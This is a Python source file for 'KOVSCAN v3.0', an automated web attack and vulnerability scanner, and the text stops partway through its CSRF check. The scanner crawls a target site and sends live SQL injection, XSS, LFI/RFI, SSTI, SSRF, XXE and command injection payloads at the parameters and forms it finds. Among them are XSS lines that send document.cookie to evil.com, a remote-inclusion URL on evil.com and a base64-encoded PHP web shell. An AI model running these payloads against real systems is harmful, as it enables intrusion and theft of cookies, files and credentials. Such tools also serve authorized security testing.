#!/usr/bin/env python3
"""
KOVSCAN v3.0 - God Tier Vulnerability Scanner
Authorized Penetration Testing Tool
"""

import socket
import ssl
import sys
import os
import re
import time
import json
import hashlib
import base64
import urllib.parse
import urllib.robotparser
import threading
from datetime import datetime
from collections import Counter
from typing import List, Dict, Tuple, Optional, Set
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin, quote, unquote
from html.parser import HTMLParser
from io import StringIO
from copy import deepcopy

try:
    import requests
    from bs4 import BeautifulSoup
except ImportError:
    print("[-] Missing required libraries. Install them with:")
    print("    pip install requests beautifulsoup4")
    sys.exit(1)


# ============================================================
# COLORS
# ============================================================

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    DIM = '\033[2m'
    BOLD = '\033[1m'
    RESET = '\033[0m'


BANNER = r"""
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║     ██╗  ██╗ ██████╗ ██╗   ██╗███████╗ ██████╗ █████╗ ███╗   ██╗  ║
║     ██║ ██╔╝██╔═══██╗██║   ██║██╔════╝██╔════╝██╔══██╗████╗  ██║  ║
║     █████╔╝ ██║   ██║██║   ██║███████╗██║     ███████║██╔██╗ ██║  ║
║     ██╔═██╗ ██║   ██║╚██╗ ██╔╝╚════██║██║     ██╔══██║██║╚██╗██║  ║
║     ██║  ██╗╚██████╔╝ ╚████╔╝ ███████║╚██████╗██║  ██║██║ ╚████║  ║
║     ╚═╝  ╚═╝ ╚═════╝   ╚═══╝  ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝  ║
║                                                                   ║
║              v3.0 — God Tier Vulnerability Scanner                ║
║         Authorized Penetration Testing & Assessment Tool          ║
║                    Developed by : DARKKING                        ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
"""


# ============================================================
# LOGGING UTILITY
# ============================================================

class Log:
    @staticmethod
    def section(msg):
        print(f"\n{Colors.CYAN}{Colors.BOLD}[ {msg} ]{Colors.RESET}")
        print(f"{Colors.DIM}{'─'*60}{Colors.RESET}")

    @staticmethod
    def info(msg):
        print(f"  {Colors.BLUE}[*]{Colors.RESET} {msg}")

    @staticmethod
    def success(msg):
        print(f"  {Colors.GREEN}[+]{Colors.RESET} {msg}")

    @staticmethod
    def warn(msg):
        print(f"  {Colors.YELLOW}[!]{Colors.RESET} {msg}")

    @staticmethod
    def error(msg):
        print(f"  {Colors.RED}[-]{Colors.RESET} {msg}")


log = Log()


# ============================================================
# SPIDER / CRAWLER
# ============================================================

class SpiderEngine:
    def __init__(self, start_url: str, max_depth: int = 3, max_pages: int = 150,
                 threads: int = 10, timeout: int = 15, cookies: dict = None,
                 proxy: str = None):
        self.start_url = start_url.rstrip('/')
        parsed = urlparse(start_url)
        self.base_domain = parsed.netloc
        self.base_scheme = parsed.scheme
        self.max_depth = max_depth
        self.max_pages = max_pages
        self.threads = threads
        self.timeout = timeout

        self.visited: Set[str] = set()
        self.to_visit: List[Tuple[str, int]] = [(self.start_url, 0)]
        self.lock = threading.Lock()

        self.urls: List[str] = []
        self.forms: List[Dict] = []
        self.params: Dict[str, List[str]] = {}
        self.emails: Set[str] = set()
        self.comments: List[str] = []
        self.javascripts: Set[str] = set()
        self.external_scripts: Set[str] = set()
        self.tech_stack: Set[str] = set()
        self.api_endpoints: Set[str] = set()

        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                           'AppleWebKit/537.36 (KHTML, like Gecko) '
                           'Chrome/125.0.0.0 Safari/537.36'),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        })

        if cookies:
            self.session.cookies.update(cookies)

        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}

        requests.packages.urllib3.disable_warnings()

    def _normalize_url(self, href: str, base: str) -> Optional[str]:
        if not href or href.startswith('#') or href.startswith('javascript:'):
            return None
        if href.startswith('data:') or href.startswith('mailto:') or href.startswith('tel:'):
            return None

        full = urljoin(base, href)
        parsed = urlparse(full)
        if parsed.scheme not in ('http', 'https'):
            return None
        if parsed.fragment:
            full = full.split('#')[0]
        if full.endswith('/'):
            full = full.rstrip('/')
        return full

    def _extract_emails(self, text: str):
        found = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text)
        for e in found:
            self.emails.add(e)

    def _extract_comments(self, html: str):
        comments = re.findall(r'<!--(.*?)-->', html, re.DOTALL)
        for c in comments:
            stripped = c.strip()
            if stripped and len(stripped) > 5:
                self.comments.append(stripped)

    def _detect_tech(self, html: str, headers: dict, url: str):
        server = headers.get('Server', '')
        if server:
            self.tech_stack.add(f"Server: {server}")
        x_powered = headers.get('X-Powered-By', '')
        if x_powered:
            self.tech_stack.add(x_powered)
        if 'wp-content' in html or 'wp-json' in html:
            self.tech_stack.add('WordPress')
        if 'Drupal' in html or 'drupal' in html:
            self.tech_stack.add('Drupal')
        if 'Joomla' in html or 'joomla' in html:
            self.tech_stack.add('Joomla')
        if 'csrf-token' in html or 'csrfmiddlewaretoken' in html:
            self.tech_stack.add('Django')
        if 'laravel' in html.lower():
            self.tech_stack.add('Laravel')
        if 'react' in html.lower() or 'reactroot' in html.lower():
            self.tech_stack.add('React')
        if 'angular' in html.lower() or 'ng-' in html:
            self.tech_stack.add('Angular')
        if 'vue' in html.lower():
            self.tech_stack.add('Vue.js')
        if 'jquery' in html.lower():
            self.tech_stack.add('jQuery')
        if 'bootstrap' in html.lower():
            self.tech_stack.add('Bootstrap')

    def _extract_forms(self, soup: BeautifulSoup, page_url: str):
        for form in soup.find_all('form'):
            form_data = {
                'action': form.get('action', ''),
                'method': form.get('method', 'GET').upper(),
                'inputs': []
            }
            for inp in form.find_all(['input', 'textarea', 'select']):
                inp_name = inp.get('name')
                if inp_name:
                    inp_type = inp.get('type', 'text')
                    inp_value = inp.get('value', '')
                    field = {
                        'name': inp_name,
                        'type': inp_type,
                        'value': inp_value,
                        'required': inp.get('required', False)
                    }
                    form_data['inputs'].append(field)
            if form_data['inputs']:
                form_data['action_url'] = self._normalize_url(form_data['action'], page_url) or page_url
                self.forms.append(form_data)

    def _extract_js(self, soup: BeautifulSoup, page_url: str):
        for script in soup.find_all('script'):
            src = script.get('src')
            if src:
                full = self._normalize_url(src, page_url)
                if full:
                    if urlparse(full).netloc == self.base_domain:
                        self.javascripts.add(full)
                    else:
                        self.external_scripts.add(full)

    def _extract_api_endpoints(self, html: str):
        patterns = [
            r'/api/[a-zA-Z0-9_/.-]+',
            r'/v[0-9]+/[a-zA-Z0-9_/.-]+',
            r'/rest/[a-zA-Z0-9_/.-]+',
            r'/graphql',
            r'/swagger',
            r'/docs',
        ]
        for pat in patterns:
            for m in re.finditer(pat, html):
                self.api_endpoints.add(m.group(0))

    def _extract_params(self, url: str):
        parsed = urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query)
        if qs:
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            if base not in self.params:
                self.params[base] = list(qs.keys())

    def _crawl_page(self, url: str, depth: int):
        if depth > self.max_depth:
            return
        try:
            resp = self.session.get(url, timeout=self.timeout)
            html = resp.text
            headers = resp.headers

            with self.lock:
                self.urls.append(url)
                self._extract_emails(html)
                self._extract_comments(html)
                self._detect_tech(html, headers, url)
                self._extract_api_endpoints(html)
                self._extract_params(url)

            soup = BeautifulSoup(html, 'html.parser')
            self._extract_forms(soup, url)
            self._extract_js(soup, url)

            # Find all links
            for a_tag in soup.find_all('a', href=True):
                href = a_tag['href']
                full = self._normalize_url(href, url)
                if full:
                    parsed = urlparse(full)
                    if parsed.netloc == self.base_domain or not parsed.netloc:
                        with self.lock:
                            if full not in self.visited and full not in [v[0] for v in self.to_visit]:
                                self.to_visit.append((full, depth + 1))

        except Exception:
            pass

    def start(self) -> Dict:
        log.section("SPIDER / CRAWLER")
        log.info(f"Target: {self.start_url}")
        log.info(f"Max depth: {self.max_depth}")
        log.info(f"Max pages: {self.max_pages}")

        start_time = time.time()

        while self.to_visit and len(self.visited) < self.max_pages:
            batch = []
            with self.lock:
                while self.to_visit and len(batch) < self.threads:
                    item = self.to_visit.pop(0)
                    if item[0] not in self.visited:
                        batch.append(item)
                        self.visited.add(item[0])

            if not batch:
                break

            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {executor.submit(self._crawl_page, url, depth): url for url, depth in batch}
                for f in as_completed(futures):
                    pass

            elapsed = time.time() - start_time
            print(f"\r  {Colors.BLUE}[*]{Colors.RESET} Crawled: {len(self.visited)} pages | "
                  f"Found: {len(self.forms)} forms | {len(self.emails)} emails | "
                  f"Time: {elapsed:.1f}s", end='')
            sys.stdout.flush()

        print()
        elapsed = time.time() - start_time
        log.success(f"Crawl complete in {elapsed:.2f}s")
        log.success(f"Pages: {len(self.visited)} | Forms: {len(self.forms)} | "
                    f"Emails: {len(self.emails)} | JS: {len(self.javascripts)}")

        return {
            'urls': self.urls,
            'forms': self.forms,
            'params': self.params,
            'emails': list(self.emails),
            'comments': self.comments,
            'javascripts': list(self.javascripts),
            'external_scripts': list(self.external_scripts),
            'tech_stack': list(self.tech_stack),
            'api_endpoints': list(self.api_endpoints),
            'domain': self.base_domain,
            'base_domain': self.base_domain,
        }


# ============================================================
# VULNERABILITY ENGINE
# ============================================================

class VulnEngine:
    def __init__(self, target: str, spider_data: dict, threads: int = 20,
                 timeout: int = 15, cookies: dict = None, proxy: str = None):
        self.target = target.rstrip('/')
        self.spider = spider_data
        self.threads = threads
        self.timeout = timeout
        self.vulnerabilities: List[Dict] = []

        self.param_urls = self._extract_param_urls()
        self.forms = spider_data.get('forms', [])

        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                           'AppleWebKit/537.36 (KHTML, like Gecko) '
                           'Chrome/125.0.0.0 Safari/537.36'),
        })
        if cookies:
            self.session.cookies.update(cookies)
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        requests.packages.urllib3.disable_warnings()

    def _extract_param_urls(self) -> List[str]:
        urls_with_params = []
        params_dict = self.spider.get('params', {})
        for base_url, param_names in params_dict.items():
            if not param_names:
                continue
            param_str = '&'.join(f"{p}=test" for p in param_names)
            full_url = f"{base_url}?{param_str}"
            urls_with_params.append(full_url)
        # Also add any URL from crawl that has a query string
        for url in self.spider.get('urls', []):
            if '?' in url and url not in urls_with_params:
                urls_with_params.append(url)
        return list(set(urls_with_params))

    def add_vuln(self, vuln_type: str, url: str, parameter: str, payload: str,
                 severity: str, description: str, evidence: str = ""):
        vuln = {
            'type': vuln_type,
            'url': url,
            'parameter': parameter,
            'payload': payload[:200] if payload else "",
            'severity': severity,
            'description': description,
            'evidence': evidence[:200] if evidence else "",
            'timestamp': datetime.now().isoformat()
        }
        self.vulnerabilities.append(vuln)
        color = Colors.RED if severity in ('CRITICAL', 'HIGH') else Colors.YELLOW
        print(f"  {color}[{severity}]{Colors.RESET} {vuln_type} @ {parameter} — {description[:60]}")

    # ---- SQL INJECTION ----
    def check_sqli(self):
        log.section("SQL INJECTION SCAN")
        sqli_error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_.*",
            r"valid PostgreSQL result",
            r"Oracle.*Driver",
            r"ORA-[0-9]{5}",
            r"Oracle error",
            r"SQLite/JDBCDriver",
            r"SQLite.Exception",
            r"System.Data.SQLite.SQLiteException",
            r"Warning.*sqlite_.*",
            r"valid SQLite",
            r"SQL Server.*Driver",
            r"Driver.*SQL Server",
            r"SQLServer JDBC Driver",
            r"com.microsoft.sqlserver",
            r"Unclosed quotation mark",
            r"Microsoft OLE DB Provider for ODBC Drivers",
            r"Microsoft OLE DB Provider for SQL Server",
            r"Microsoft JET Database Engine",
            r"ODBC Microsoft Access Driver",
        ]

        sqli_payloads = [
            "'", "\"", "')", "'))", "\")", "\"))",
            "' OR '1'='1", "' OR '1'='1'--",
            "\" OR \"1\"=\"1", "\" OR \"1\"=\"1\"--",
            "' OR 1=1--", "\" OR 1=1--",
            "' OR '1'='1' #", "\" OR \"1\"=\"1\" #",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,2,3,4--",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' AND 1=1--", "' AND 1=2--",
            "1' AND '1'='1", "1' AND '1'='2",
            "' AND SLEEP(5)--",
            "' WAITFOR DELAY '0:0:5'--",
            "'; WAITFOR DELAY '0:0:5'--",
            "1' AND SLEEP(5) AND '1'='1",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "'; SELECT SLEEP(5); --",
            "1' ORDER BY 1--", "1' ORDER BY 10--", "1' ORDER BY 100--",
            "1' GROUP BY 1--",
        ]

        def test_sqli(url: str):
            parsed = urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            for param_name, param_values in params.items():
                for payload in sqli_payloads:
                    try:
                        test_url = url.replace(
                            f"{param_name}={param_values[0]}",
                            f"{param_name}={quote(payload)}"
                        )
                        start = time.time()
                        resp = self.session.get(test_url, timeout=min(self.timeout, 8))
                        elapsed = time.time() - start

                        # Error-based detection
                        for pattern in sqli_error_patterns:
                            if re.search(pattern, resp.text, re.IGNORECASE):
                                self.add_vuln(
                                    "SQL Injection (Error-based)", url, param_name, payload,
                                    "CRITICAL",
                                    "SQL error reflected in response",
                                    f"Pattern: {pattern}"
                                )
                                break

                        # Time-based detection (SLEEP)
                        if 'SLEEP(' in payload.upper() or 'WAITFOR' in payload.upper():
                            if elapsed > 4.5:
                                self.add_vuln(
                                    "SQL Injection (Time-based)", url, param_name, payload,
                                    "CRITICAL",
                                    "Time-based SQL injection confirmed",
                                    f"Response time: {elapsed:.2f}s"
                                )
                                break

                        # Boolean-based detection
                        if "' AND 1=1" in payload or "' AND 1=2" in payload:
                            pass  # Would need baseline comparison

                    except Exception:
                        continue

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(test_sqli, u) for u in self.param_urls]
            for f in as_completed(futures):
                pass
        log.info(f"SQLi scan complete. Found: {sum(1 for v in self.vulnerabilities if 'SQL' in v['type'])}")

    # ---- XSS ----
    def check_xss(self):
        log.section("XSS (CROSS-SITE SCRIPTING) SCAN")
        xss_payloads = [
            "<script>alert(1)</script>",
            "<script>confirm(1)</script>",
            "<script>prompt(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<details open ontoggle=alert(1)>",
            "<select autofocus onfocus=alert(1)>",
            "<textarea autofocus onfocus=alert(1)>",
            "<keygen autofocus onfocus=alert(1)>",
            "<marquee onstart=alert(1)>",
            "<video><source onerror=alert(1)>",
            "<audio><source onerror=alert(1)>",
            "<script>fetch('https://evil.com/?c='+document.cookie)</script>",
            "<script>new Image().src='https://evil.com/?c='+document.cookie</script>",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>",
            "\"><img src=x onerror=alert(1)>",
            "'><img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "\" autofocus onfocus=alert(1) x=\"",
            "' autofocus onfocus=alert(1) x='",
            "<<script>alert(1)</script>",
            "<ScRiPt>alert(1)</sCrIpT>",
            "<IMG SRC=\"javascript:alert('XSS')\">",
            "<IMG SRC=javascript:alert('XSS')>",
            "<IMG SRC=JaVaScRiPt:alert('XSS')>",
            "<IMG SRC=javascript:alert(&quot;XSS&quot;)>",
            "<IMG SRC=`javascript:alert(\"XSS\")`>",
            "<IMG \"\"\"><script>alert(\"XSS\")</script>\"",
            "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
            "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
            "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
            "<SCRIPT>alert(/XSS/.source)</SCRIPT>",
            "</TITLE><SCRIPT>alert(\"XSS\")</SCRIPT>",
            "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS')\">",
            "<BODY BACKGROUND=\"javascript:alert('XSS')\">",
            "<IFRAME SRC=\"javascript:alert('XSS')\"></IFRAME>",
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//",
        ]

        def test_xss(url: str):
            parsed = urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            for param_name, param_values in params.items():
                for payload in xss_payloads:
                    try:
                        test_url = url.replace(
                            f"{param_name}={param_values[0]}",
                            f"{param_name}={quote(payload)}"
                        )
                        resp = self.session.get(test_url, timeout=self.timeout)
                        if payload in resp.text and '<' in payload:
                            self.add_vuln(
                                "XSS (Reflected)", url, param_name, payload,
                                "HIGH",
                                "Reflected XSS — payload echoed in response",
                                f"Payload rendered in page"
                            )
                            break
                    except Exception:
                        continue

        # Test forms for XSS
        def test_xss_form(form: Dict):
            action_url = form.get('action_url') or self.target
            method = form.get('method', 'GET')
            for payload in xss_payloads[:10]:
                try:
                    data = {}
                    for inp in form.get('inputs', []):
                        name = inp.get('name', '')
                        if inp.get('type') in ('submit', 'button', 'hidden'):
                            data[name] = inp.get('value', 'test')
                        else:
                            data[name] = payload
                    if method == 'POST':
                        resp = self.session.post(action_url, data=data, timeout=self.timeout)
                    else:
                        resp = self.session.get(action_url, params=data, timeout=self.timeout)
                    if payload in resp.text and '<' in payload:
                        self.add_vuln(
                            "XSS (Stored/Form)", action_url, "form field", payload,
                            "HIGH",
                            "XSS via form submission — payload reflected",
                            f"Form action: {action_url}"
                        )
                        break
                except Exception:
                    continue

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(test_xss, u) for u in self.param_urls]
            for f in as_completed(futures):
                pass
            futures2 = [executor.submit(test_xss_form, f) for f in self.forms[:20]]
            for f in as_completed(futures2):
                pass
        log.info(f"XSS scan complete. Found: {sum(1 for v in self.vulnerabilities if 'XSS' in v['type'])}")

    # ---- LFI / RFI ----
    def check_lfi_rfi(self):
        log.section("LFI/RFI SCAN")
        lfi_payloads = [
            "/etc/passwd",
            "/etc/hosts",
            "/etc/hostname",
            "/etc/issue",
            "/etc/group",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/proc/version",
            "windows\\system32\\drivers\\etc\\hosts",
            "boot.ini",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "php://filter/read=convert.base64-encode/resource=/etc/passwd",
            "file:///etc/passwd",
            "../../../../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../etc/passwd",
            "../../etc/passwd",
            "....//....//....//....//etc/passwd",
            "..%252f..%252f..%252f..%252fetc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
        ]
        rfi_payloads = [
            "http://evil.com/shell.txt?",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
            "php://input",
        ]
        lfi_indicators = ["root:x:0:0:", "daemon:x:1:1:", "bin:x:2:2:", "# MySQL host", "DB_HOST", "DB_PASSWORD"]
        inc_params = ['file', 'page', 'include', 'inc', 'load', 'view', 'template',
                      'dir', 'path', 'doc', 'document', 'root', 'folder', 'pg',
                      'show', 'cat', 'content', 'url', 'loc', 'location']

        def test_lfi_rfi(url: str):
            parsed = urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            for param_name, param_values in params.items():
                if param_name.lower() not in inc_params:
                    continue
                for payload in lfi_payloads:
                    try:
                        test_url = url.replace(
                            f"{param_name}={param_values[0]}",
                            f"{param_name}={quote(payload)}"
                        )
                        resp = self.session.get(test_url, timeout=self.timeout)
                        for indicator in lfi_indicators:
                            if indicator in resp.text:
                                sev = "CRITICAL" if "shadow" in payload or "environ" in payload else "HIGH"
                                self.add_vuln("LFI", url, param_name, payload, sev,
                                              "LFI confirmed — file contents in response", f"Indicator: {indicator}")
                                break
                    except Exception:
                        continue
                for payload in rfi_payloads:
                    try:
                        test_url = url.replace(
                            f"{param_name}={param_values[0]}",
                            f"{param_name}={quote(payload)}"
                        )
                        resp = self.session.get(test_url, timeout=self.timeout, allow_redirects=False)
                        if resp.status_code == 200 and len(resp.text) > 0:
                            self.add_vuln("RFI", url, param_name, payload, "CRITICAL",
                                          "Remote File Inclusion — possible RCE",
                                          f"Status: {resp.status_code}, Size: {len(resp.text)}")
                    except Exception:
                        continue

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(test_lfi_rfi, u) for u in self.param_urls]
            for f in as_completed(futures):
                pass
        log.info(f"LFI/RFI scan complete. Found: {sum(1 for v in self.vulnerabilities if 'LFI' in v['type'] or 'RFI' in v['type'])}")

    # ---- SSTI ----
    def check_ssti(self):
        log.section("SSTI (TEMPLATE INJECTION) SCAN")
        ssti_payloads = [
            "{{7*7}}", "${7*7}", "#{7*7}", "*{7*7}",
            "{{config}}",
            "{{7*'7'}}",
            "{$smarty.version}",
            "<%= 7*7 %>",
        ]

        def test_ssti(url: str):
            parsed = urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            for param_name, param_values in params.items():
                for payload in ssti_payloads:
                    try:
                        test_url = url.replace(
                            f"{param_name}={param_values[0]}",
                            f"{param_name}={quote(payload)}"
                        )
                        resp = self.session.get(test_url, timeout=self.timeout)
                        if "49" in resp.text and payload in ("{{7*7}}", "${7*7}", "#{7*7}"):
                            self.add_vuln("SSTI", url, param_name, payload, "CRITICAL",
                                          "Template injection confirmed — RCE may be possible",
                                          "Payload evaluated to 49")
                            break
                        if payload == "{{config}}" and any(x in resp.text for x in ["SECRET_KEY", "DEBUG", "DATABASE"]):
                            self.add_vuln("SSTI (Config Exposure)", url, param_name, payload, "CRITICAL",
                                          "Template injection exposing app configuration", "Config leaked")
                            break
                    except Exception:
                        continue

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(test_ssti, u) for u in self.param_urls]
            for f in as_completed(futures):
                pass
        log.info(f"SSTI scan complete. Found: {sum(1 for v in self.vulnerabilities if 'SSTI' in v['type'])}")

    # ---- SSRF ----
    def check_ssrf(self):
        log.section("SSRF SCAN")
        ssrf_params = ['url', 'uri', 'path', 'dest', 'destination', 'redirect', 'redirect_uri',
                       'return', 'return_to', 'return_url', 'next', 'target', 'link', 'nav',
                       'callback', 'webhook', 'fetch', 'load', 'src', 'source', 'file',
                       'image', 'img', 'img_url', 'avatar', 'profile', 'document', 'folder',
                       'root', 'host', 'port', 'domain', 'site', 'show', 'page']
        ssrf_test_urls = [
            "http://127.0.0.1:80",
            "http://127.0.0.1:8080",
            "http://localhost:80",
            "http://0.0.0.0:80",
            "file:///etc/passwd",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/",
        ]

        def test_ssrf(url: str):
            parsed = urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            for param_name, param_values in params.items():
                if param_name.lower() not in ssrf_params:
                    continue
                for test_url in ssrf_test_urls:
                    try:
                        encoded = url.replace(
                            f"{param_name}={param_values[0]}",
                            f"{param_name}={quote(test_url)}"
                        )
                        resp = self.session.get(encoded, timeout=min(self.timeout, 5), allow_redirects=False)
                        if resp.status_code == 200:
                            if any(x in resp.text.lower() for x in ['root:', 'meta-data', 'ami-id', 'instance-id']):
                                self.add_vuln("SSRF", url, param_name, test_url, "CRITICAL",
                                              "SSRF confirmed — internal/cloud metadata accessible",
                                              "Internal data in response")
                                break
                    except requests.exceptions.ConnectionError:
                        self.add_vuln("SSRF (Internal Connection)", url, param_name, test_url, "MEDIUM",
                                      "SSRF — server attempted internal connection",
                                      "Connection refused (tried to connect)")
                    except Exception:
                        continue

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(test_ssrf, u) for u in self.param_urls]
            for f in as_completed(futures):
                pass
        log.info(f"SSRF scan complete. Found: {sum(1 for v in self.vulnerabilities if 'SSRF' in v['type'])}")

    # ---- XXE ----
    def check_xxe(self):
        log.section("XXE SCAN")
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>',
            '<?xml version="1.0"?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>',
        ]
        xxe_indicators = ["root:x:0:0:", "failed to open stream", "I/O warning", "XMLParseError"]

        def test_xxe_form(form: Dict):
            action_url = form.get('action_url') or self.target
            method = form.get('method', 'POST').upper()
            for payload in xxe_payloads:
                try:
                    headers = {'Content-Type': 'application/xml'}
                    if method == 'POST':
                        resp = self.session.post(action_url, data=payload, headers=headers, timeout=self.timeout)
                    else:
                        resp = self.session.get(action_url, params={'xml': payload}, timeout=self.timeout)
                    for indicator in xxe_indicators:
                        if indicator in resp.text:
                            self.add_vuln("XXE", action_url, "XML Body", payload[:60], "CRITICAL",
                                          "XXE confirmed — file contents visible", f"Indicator: {indicator}")
                            break
                except Exception:
                    continue

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(test_xxe_form, f) for f in self.forms[:20]]
            for f in as_completed(futures):
                pass
        log.info(f"XXE scan complete. Found: {sum(1 for v in self.vulnerabilities if 'XXE' in v['type'])}")

    # ---- COMMAND INJECTION ----
    def check_cmdi(self):
        log.section("COMMAND INJECTION SCAN")
        cmdi_payloads = [
            "; id", "| id", "& id", "&& id", "`id`", "$(id)",
            "; whoami", "| whoami", "& whoami",
            "; cat /etc/passwd", "| cat /etc/passwd",
            "| dir", "; dir", "& dir", "&& dir",
            ";sleep 5", "|sleep 5", "&sleep 5&", "`sleep 5`", "$(sleep 5)",
        ]
        cmdi_indicators = ["uid=", "gid=", "groups=", "root:x:0:0:", "Volume Serial Number", "Directory of "]

        def test_cmdi(url: str):
            parsed = urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            for param_name, param_values in params.items():
                for payload in cmdi_payloads:
                    try:
                        test_url = url.replace(
                            f"{param_name}={param_values[0]}",
                            f"{param_name}={quote(payload)}"
                        )
                        resp = self.session.get(test_url, timeout=min(self.timeout, 8))
                        for indicator in cmdi_indicators:
                            if indicator in resp.text:
                                self.add_vuln("Command Injection", url, param_name, payload, "CRITICAL",
                                              "OS command injection confirmed", f"Indicator: {indicator}")
                                break
                        # Time-based
                        if 'sleep' in payload.lower():
                            start = time.time()
                            self.session.get(test_url, timeout=10)
                            elapsed = time.time() - start
                            if elapsed > 4.5:
                                self.add_vuln("Command Injection (Time-based)", url, param_name, payload,
                                              "CRITICAL", "Blind command injection via sleep",
                                              f"Response time: {elapsed:.2f}s")
                                break
                    except Exception:
                        continue

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(test_cmdi, u) for u in self.param_urls]
            for f in as_completed(futures):
                pass
        log.info(f"CMDi scan complete. Found: {sum(1 for v in self.vulnerabilities if 'Command' in v['type'])}")

    # ---- OPEN REDIRECT ----
    def check_open_redirect(self):
        log.section("OPEN REDIRECT SCAN")
        redirect_params = ['url', 'redirect', 'redirect_uri', 'redirect_url', 'return',
                          'return_to', 'return_url', 'next', 'next_url', 'target', 'link',
                          'goto', 'dest', 'destination', 'out', 'view', 'dir', 'path',
                          'site', 'html', 'file', 'document', 'folder', 'data']
        redirect_payloads = [
            "https://evil.com",
            "//evil.com",
            "///evil.com",
            "https://evil.com%40",
            "\\evil.com",
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
        ]

        def test_redirect(url: str):
            parsed = urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            for param_name, param_values in params.items():
                if param_name.lower() not in redirect_params:
                    continue
                for payload in redirect_payloads:
                    try:
                        test_url = url.replace(
                            f"{param_name}={param_values[0]}",
                            f"{param_name}={quote(payload)}"
                        )
                        resp = self.session.get(test_url, timeout=self.timeout, allow_redirects=False)
                        if resp.status_code in (301, 302, 303, 307, 308):
                            location = resp.headers.get('Location', '')
                            if 'evil' in location or 'javascript:' in location or 'data:' in location:
                                self.add_vuln("Open Redirect", url, param_name, payload, "MEDIUM",
                                              "Open redirect — phishing risk", f"Redirects to: {location}")
                                break
                    except Exception:
                        continue

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(test_redirect, u) for u in self.param_urls]
            for f in as_completed(futures):
                pass
        log.info(f"Open Redirect scan complete. Found: {sum(1 for v in self.vulnerabilities if 'Redirect' in v['type'])}")

    # ---- CSRF ----
    def check_csrf(self):
        log.section("CSRF SCAN")
        csrf_indicators = ['csrf', 'nonce', 'token', '_token', 'xsrf', 'authenticity_token',
                          'csrf_token', 'csrfmiddlewaretoken', '__csrf', '_csrf', 'csrf-token',
                          'X-CSRF-Token', '__RequestVerificationToken', 'form_token', 'security_token']

        for form in self.forms:
            action_url = form.get('action_url') or self.target
            method = form.get('method', 'POST').upper()
            if method != 'POST':
                continue
            input_names = [inp['name'].lower() for inp in form.get('inputs', []) if inp.get('name')]
            has_csrf = any(
                any(csrf_name in inp_name for csrf_name in csrf_indicators)
                for inp_name in input_names
            )
            if not has_csrf:
                try:
                    resp = self.session.get(action_url, timeout=self.timeout)
                    html = resp.text.lower()
                    has_csrf_meta = any(
